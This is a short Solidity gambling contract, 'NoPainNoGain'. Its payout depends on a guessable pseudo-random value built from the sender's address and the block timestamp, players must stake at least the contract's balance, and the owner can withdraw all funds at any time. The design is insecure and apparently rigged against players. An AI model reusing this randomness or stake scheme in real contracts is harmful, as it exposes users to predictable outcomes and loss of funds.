1 pragma solidity ^0.4.19;
2 contract NoPainNoGain {
3 
4     address private Owner = msg.sender;
5     
6     function NoPainNoGain() public payable {}
7     function() public payable {}
8    
9     function Withdraw() public {
10         require(msg.sender == Owner);
11         Owner.transfer(this.balance);
12     }
13     
14     function Play(uint n) public payable {
15         if(rand(msg.sender) * n < rand(Owner) && msg.value >= this.balance && msg.value > 0.25 ether)
16             // You have to risk as much as the contract do
17             msg.sender.transfer(this.balance+msg.value);
18     }
19 	
20 	function rand(address a) private view returns(uint) {
21 		return uint(keccak256(uint(a) + now));
22 	}
23 }